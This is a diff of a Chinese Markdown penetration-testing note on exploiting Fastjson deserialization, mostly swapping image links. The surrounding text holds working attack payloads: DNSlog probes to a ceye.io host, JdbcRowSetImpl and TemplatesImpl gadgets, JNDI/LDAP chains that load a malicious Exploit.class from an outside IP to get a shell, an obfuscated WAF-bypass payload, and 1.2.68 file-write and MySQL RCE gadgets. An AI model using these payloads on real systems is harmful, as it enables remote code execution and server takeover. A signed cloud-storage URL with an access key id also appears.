@@ -9,27 +9,26 @@
 
 使用`{"@type": "java.lang.AutoCloseable"`或者 `"{"a":x"`通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
 
-<img src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png" title="" alt="image.png" data-align="center">
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162119-9twhx22.png)
 
-<img src="https://s2.loli.net/2022/02/20/pEBv8NlifAXWRQ2.png" title="" alt="" data-align="center">
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162127-cb8po6i.png)
 
 **无回显使用dnslog探测POC：**
 
-```json
-1. {"@type":"java.net.InetSocketAddress"{"address":,"val":"sq20yi.ceye.io"}}
-2. {"@type":"java.net.Inet4Address","val":"sq20yi.ceye.io"}
-3. {"@type":"java.net.Inet6Address","val":"sq20yi.ceye.io"}
-4. {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://sq20yi.ceye.io"}}""}
-5. Set[{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}]
-```
+1. `{"@type":"java.net.InetSocketAddress"{"address":,"val":"sq20yi.ceye.io"}}`
+2. `{"@type":"java.net.Inet4Address","val":"sq20yi.ceye.io"}`
+3. `{"@type":"java.net.Inet6Address","val":"sq20yi.ceye.io"}`
+4. `{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://sq20yi.ceye.io"}}""}`
+5. `Set[{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}`
+6. `{{"@type":"java.net.URL","val":"http://sq20yi.ceye.io"}:0`
 
 抓包修改请求体
 
-![image.png](https://s2.loli.net/2022/02/18/cTaBJ4ZejDRHNoS.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162201-uhi8rol.png)
 
 ==dnslog==收到请求信息就代表使用了==fastjson==来解析的json数据
 
-![image.png](https://s2.loli.net/2022/02/18/alYc3PuyKEJZxjQ.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162210-q7l8fzu.png)
 
 ## 验证是否存在漏洞
 
@@ -61,17 +60,20 @@ public class Exploit {
 
 发送payload，getshell
 
-![image.png](https://s2.loli.net/2022/02/18/76urkNqS3WBHeRT.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162241-ffuphz4.png)
 
 **实战基本是直接拿47版本的payload打dnslog，dnslog有反应就继续，没反应再一步一步验证。 🙃效率高很多。**
 
 ## 绕过高版本jdk对jndi注入的限制
 
 > 高版本jdk默认禁止jndi注入。
+>
 
 > 所以基于jndi+RMI的利用需要JDK版本<=6u141、7u131、8u121，
+>
 
 > 基于jndi+LDAP利用的JDK版本<=6u211、7u201、8u191、11.0.1
+>
 
 ### **如何判断服务是否使用高版本jdk**
 
@@ -79,13 +81,13 @@ public class Exploit {
 
 ldap收到请求重定向到[http://47.119.161.84:888/Exploit.class](http://47.119.161.84:888/Exploit.class)。 再发起http请求加载Exploit.class(弹计算器)
 
-![image.png](https://s2.loli.net/2022/02/18/KlvLOjMSBwNGogJ.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162314-b5xlbic.png)
 
 高版本jdk的jndi注入（jdk1.8.212）：
 
 ldap服务收到了请求，可我们起的http服务却没有反应，也就访问不到我们的恶意类了。
 
-![image-20220220011650815](https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162323-ud3jh7y.png)
 
 所以实战情况下遇到上述情况（**ldap服务收到信息，却没有http请求**）多半可以断定是采用高版本jdk。
 
@@ -109,32 +111,31 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 
 ：**见视频** 😇
 
-视频有些敏感，不公开了。
-
 ## fastjson不出网与命令回显
 
 > 注：此攻击手法同样适用于高版本jdk下的利用
+>
 
 1.2.24版本的三个POC：
 
 ```json
 1. 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
 {
-        "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
-        "_bytecodes":["poc_base64"],
-        '_name':'a.b',
-        '_tfactory':{ },
-        "_outputProperties":{},
-        "_name":"a",
-        "_version":"1.0",
-        "allowedProtocols":"all"
+		"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+		"_bytecodes":["poc_base64"],
+		'_name':'a.b',
+		'_tfactory':{ },
+		"_outputProperties":{},
+		"_name":"a",
+		"_version":"1.0",
+		"allowedProtocols":"all"
 }
 2.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多）
 
 {
-        "@type":"com.sun.rowset.JdbcRowSetImpl", 
-        "dataSourceName":"ldap://localhost:1389/Exploit", 
-        "autoCommit":true
+		"@type":"com.sun.rowset.JdbcRowSetImpl", 
+		"dataSourceName":"ldap://localhost:1389/Exploit", 
+		"autoCommit":true
 }
 
 3.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource
@@ -213,7 +214,7 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 
 第二个依赖于`tomcat（tomcat6、7：dbcp ； tomcat8：dbcp2）`且jdk版本≤8u251；
 
-![image.png](https://s2.loli.net/2022/02/18/1HN63fCqpDYdAWM.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162344-n98p0ii.png)
 
 ## 绕waf
 
@@ -225,13 +226,13 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 
 `{"name":{"@\u0074\u0079\u0070\u0065":/*asdasd*/\r\n"java.l\x61ng.Cl\x61ss","val":"com.sun.rowset.JdbcRo\x77\x53etImpl"},"x":{"@\u0074\u0079\u0070\u0065":"com.sun.rowset.Jd\x62\x63RowSetImpl","dataSourceName":"ldap://11.11.11.11:1389/Exploit","autoCommit":true}}}`
 
-![image.png](https://s2.loli.net/2022/02/18/l8PUeQ4vaRLMXs6.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162404-1sehcou.png)
 
-![image.png](https://s2.loli.net/2022/02/18/jwLAblW7GOXNfxK.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162415-9o7qk74.png)
 
-![image.png](https://s2.loli.net/2022/02/18/yoj4ncVLTKSROet.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162424-a5nmi1q.png)
 
-![image.png](https://s2.loli.net/2022/02/18/vsEXeVbzJufi8Dj.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162432-mui1a40.png)
 
 ## fastjson1.2.68利用
 
@@ -251,7 +252,7 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 
 本地windows测试第一次成功写入，后面的只创建了文件并没有写入，需要刷新缓存或者重启服务才行
 
-![image.png](https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162445-kyda3kd.png)
 
 ### Mysql RCE
 
@@ -262,6 +263,7 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 [https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat USA 2021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D](https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat%20USA%202021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D)
 
 ```csharp
+
 5.1.x(SSRF)，5.1.11-5.1.48(反序列化链)
 {
   "@type": "java.lang.AutoCloseable",
@@ -317,9 +319,10 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 
 ---
 
-![image.png](https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20211105162458-mi98hl3.png)
 
 > **以下为去年去年调试分析时的笔记，大量参考（拙劣模仿）了phith0n、kingx、mi1k7ea等师傅的文章，仅供参考。强烈建议阅读原文。文末有链接**
+>
 
 # 0x02 调试分析
 
@@ -493,13 +496,13 @@ PoC中几个重要的Json键的含义：
 
 当解析到_outputProperties的内容时，看到前面的下划线被去掉了：
 
-![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&display=inline&height=529&margin=%5Bobject%20Object%5D&originHeight=529&originWidth=982&size=0&status=done&style=none&width=982](https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png)
+![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&display=inline&height=529&margin=%5Bobject%20Object%5D&originHeight=529&originWidth=982&size=0&status=done&style=none&width=982](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&display=inline&height=529&margin=%5Bobject%20Object%5D&originHeight=529&originWidth=982&size=0&status=done&style=none&width=982)
 
 跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 
 方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：
 
-![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&display=inline&height=382&margin=%5Bobject%20Object%5D&originHeight=382&originWidth=1279&size=0&status=done&style=none&width=1279](https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png)
+![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&display=inline&height=382&margin=%5Bobject%20Object%5D&originHeight=382&originWidth=1279&size=0&status=done&style=none&width=1279](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&display=inline&height=382&margin=%5Bobject%20Object%5D&originHeight=382&originWidth=1279&size=0&status=done&style=none&width=1279)
 
 跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：
 
@@ -834,6 +837,7 @@ protected ConnectionFactory createConnectionFactory() throws SQLException {
 为true时，类加载后将会直接执行static{}块中的代码。 因为driverClassLoader和driverClassName
 
 都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可，com.sun.org.apache.bcel.internal.util.ClassLoader，这是一个神奇的ClassLoader，因为它会直接从classname中提取Class的bytecode数据。
+
 
 ![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1806&size=89911&status=done&style=none&width=903](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1806&size=89911&status=done&style=none&width=903)
 
